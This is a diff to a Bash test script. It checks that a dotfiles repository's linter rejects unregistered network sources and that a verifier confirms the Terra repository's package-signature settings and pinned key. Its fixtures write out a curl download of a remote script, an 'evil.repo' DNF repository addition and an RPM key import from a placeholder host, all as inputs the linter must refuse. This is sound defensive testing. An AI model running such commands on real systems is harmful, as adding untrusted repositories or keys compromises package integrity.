@@ -123,6 +123,60 @@ rm -f -- "$fixture_repo/scripts/mentions-curl.sh"
 git -C "$fixture_repo" add -A
 printf 'PASS: naming curl without invoking it needs no annotation\n'
 
+# Files are selected by what they are, not only by their suffix: an
+# extensionless public entry point, a stowed command the role inventory
+# classifies, and an asset known only by its shebang are all scanned.
+for scanned_file in doctor bin/.local/bin/theme platforms/fedora/assets/dotfiles-sway; do
+  printf 'curl -fsSL https://example.invalid/x.sh --output /tmp/x\n' \
+    >>"$fixture_repo/$scanned_file"
+  if lint_output="$(lint_fixture)"; then
+    printf 'The linter accepted an unregistered curl source in %s.\n' \
+      "$scanned_file" >&2
+    exit 1
+  fi
+  assert_contains "$lint_output" "network sources: $scanned_file:"
+  assert_contains "$lint_output" 'unregistered curl network source'
+  git -C "$fixture_repo" checkout -q -- "$scanned_file"
+done
+lint_fixture >/dev/null
+printf 'PASS: extensionless and shebang-only scripts are scanned for network sources\n'
+
+# Adding a package repository or a signing key gives the machine a new trust
+# root, which is more than a download, so both must be registered too.
+trust_root_installer=platforms/fedora/scripts/install-system.sh
+cat >>"$fixture_repo/$trust_root_installer" <<'EOF'
+sudo dnf config-manager addrepo --from-repofile=https://example.invalid/evil.repo
+sudo rpm --import https://example.invalid/key.asc
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered package trust root.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" \
+  "network sources: $trust_root_installer:"
+assert_contains "$lint_output" 'unregistered dnf-addrepo network source'
+assert_contains "$lint_output" 'unregistered rpm-key-import network source'
+git -C "$fixture_repo" checkout -q -- "$trust_root_installer"
+printf 'PASS: an unregistered DNF repository or RPM signing key fails the linter\n'
+
+# The real call sites are flagged as well: only their annotation passes them.
+for annotated in platforms/fedora/lib/tailscale.sh:tailscale-repo:dnf-addrepo \
+  platforms/fedora/lib/fedora.sh:terra-signing-key:rpm-key-import; do
+  IFS=: read -r annotated_file annotated_id annotated_label <<<"$annotated"
+  sed -i "/# network-source: $annotated_id\$/d" "$fixture_repo/$annotated_file"
+  if lint_output="$(lint_fixture)"; then
+    printf 'The linter accepted %s without its annotation.\n' \
+      "$annotated_file" >&2
+    exit 1
+  fi
+  assert_contains "$lint_output" \
+    "network sources: $annotated_file:"
+  assert_contains "$lint_output" "unregistered $annotated_label network source"
+  git -C "$fixture_repo" checkout -q -- "$annotated_file"
+done
+lint_fixture >/dev/null
+printf 'PASS: the real repository and signing-key call sites need their annotations\n'
+
 # --- Tier claims must match the integrity mechanism -------------------------
 
 manifest_fixture="$test_root/network-sources.tsv"
@@ -185,18 +239,35 @@ terra_other_fpr=2222222222222222222222222222222222222222
 mkdir -p "$terra_bin"
 printf '# releasever\tfingerprint\n90\t%s\n' "$terra_pinned_fpr" >"$terra_manifest"
 
+# The RPM keyring is modelled as "fixture-key:<fingerprint>" lines, which is
+# what the rpm stub prints as each key's description and the gpg stub turns
+# back into colon records.
 cat >"$terra_bin/rpm" <<'EOF'
 #!/usr/bin/env bash
-case "$1" in
--q) [[ -e "$MOCK_STATE/terra-release" ]] ;;
--E) printf '%s\n' "$MOCK_RELEASEVER" ;;
---import) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
+case "$1 ${2:-}" in
+'-q terra-release') [[ -e "$MOCK_STATE/terra-release" ]] ;;
+'-q gpg-pubkey')
+  [[ -s "$MOCK_STATE/keyring" ]] || {
+    printf 'package gpg-pubkey is not installed\n'
+    exit 1
+  }
+  cat "$MOCK_STATE/keyring"
+  ;;
+'-E %fedora') printf '%s\n' "$MOCK_RELEASEVER" ;;
+--import*) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
 *) exit 64 ;;
 esac
 EOF
 cat >"$terra_bin/gpg" <<'EOF'
 #!/usr/bin/env bash
 [[ "$1 $2" == '--show-keys --with-colons' ]] || exit 64
+if (($# == 2)); then
+  awk -F: '$1 == "fixture-key" {
+    print "pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:"
+    print "fpr:::::::::" $2 ":"
+  }'
+  exit 0
+fi
 printf 'pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:\n'
 printf 'fpr:::::::::%s:\n' "$MOCK_FPR"
 EOF
@@ -217,6 +288,11 @@ exec "$@"
 EOF
 cat >"$terra_bin/dnf" <<'EOF'
 #!/usr/bin/env bash
+if [[ "$1" == --dump-repo-config=terra ]]; then
+  printf '======== "terra" repository configuration: ========\n'
+  printf 'gpgcheck = %s\npkg_gpgcheck = %s\n' "$MOCK_GPGCHECK" "$MOCK_GPGCHECK"
+  exit 0
+fi
 printf 'dnf %s\n' "$*" >>"$MOCK_LOG"
 : >"$MOCK_STATE/terra-release"
 EOF
@@ -270,6 +346,74 @@ assert_success
 assert_contains "$TEST_OUTPUT" "caller's explicit acknowledgement"
 assert_file_contains "$terra_log" 'rpm --import'
 printf 'PASS: an acknowledged unpinned key is imported\n'
+
+# --- Terra: the verifier re-asserts the trust root on every run ------------
+
+# The bootstrap returns early once terra-release is installed, so these cases
+# drive the read-only verifier section with the same stubs. MOCK_LOG records
+# every sudo, import and install; the verifier must leave it empty.
+assert_file_contains "$repo_root/platforms/fedora/scripts/verify.sh" \
+  'verify_terra_trust_root'
+
+# run_terra_verify <terra-release installed?> <releasever> <gpgcheck>
+#   [keyring fingerprint ...]
+# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
+run_terra_verify() {
+  local installed="$1" releasever="$2" gpgcheck="$3"
+  shift 3
+  rm -rf -- "$terra_state"
+  mkdir -p "$terra_state"
+  : >"$terra_log"
+  [[ "$installed" != true ]] || : >"$terra_state/terra-release"
+  (($# == 0)) || printf 'fixture-key:%s\n' "$@" >"$terra_state/keyring"
+  run_capture env PATH="$terra_bin:$PATH" \
+    MOCK_LOG="$terra_log" MOCK_STATE="$terra_state" \
+    MOCK_RELEASEVER="$releasever" MOCK_GPGCHECK="$gpgcheck" \
+    TERRA_KEY_MANIFEST="$terra_manifest" \
+    bash -c '
+      set -u
+      source "$1/common/lib/common.sh"
+      source "$1/common/lib/verify.sh"
+      source "$1/platforms/fedora/lib/fedora.sh"
+      verify_terra_trust_root
+      finish_verification "Terra trust root"
+    ' _ "$repo_root" </dev/null
+}
+
+run_terra_verify true 90 1 "$terra_other_fpr" "$terra_pinned_fpr"
+assert_success
+assert_contains "$TEST_OUTPUT" 'terra repository enforces package signatures (gpgcheck = 1)'
+assert_contains "$TEST_OUTPUT" \
+  "Terra signing key for Fedora 90 is in the RPM keyring and matches the pinned fingerprint $terra_pinned_fpr"
+assert_file_empty "$terra_log"
+printf 'PASS: the verifier accepts gpgcheck = 1 with the pinned key in the keyring, read-only\n'
+
+run_terra_verify true 90 0 "$terra_pinned_fpr"
+assert_failure
+assert_contains "$TEST_OUTPUT" 'terra repository has gpgcheck = 0, pkg_gpgcheck = 0, expected 1'
+assert_file_empty "$terra_log"
+printf 'PASS: the verifier fails a terra repository with gpgcheck = 0\n'
+
+run_terra_verify true 90 1 "$terra_other_fpr"
+assert_failure
+assert_contains "$TEST_OUTPUT" \
+  "The pinned Terra signing key for Fedora 90 ($terra_pinned_fpr) is not in the RPM keyring"
+run_terra_verify true 90 1
+assert_failure
+assert_contains "$TEST_OUTPUT" "($terra_pinned_fpr) is not in the RPM keyring"
+assert_file_empty "$terra_log"
+printf 'PASS: the verifier fails when the pinned Terra key is missing from the keyring\n'
+
+run_terra_verify true 91 1 "$terra_other_fpr"
+assert_success
+assert_contains "$TEST_OUTPUT" 'No pinned Terra signing key for Fedora 91'
+assert_contains "$TEST_OUTPUT" 'passed with warnings'
+printf 'PASS: the verifier warns, like the installer, for an unpinned Fedora release\n'
+
+run_terra_verify false 90 1 "$terra_pinned_fpr"
+assert_failure
+assert_contains "$TEST_OUTPUT" 'terra-release is not installed'
+printf 'PASS: the verifier fails when terra-release is not installed\n'
 
 # --- Bounded fetch behaviour ------------------------------------------------
 
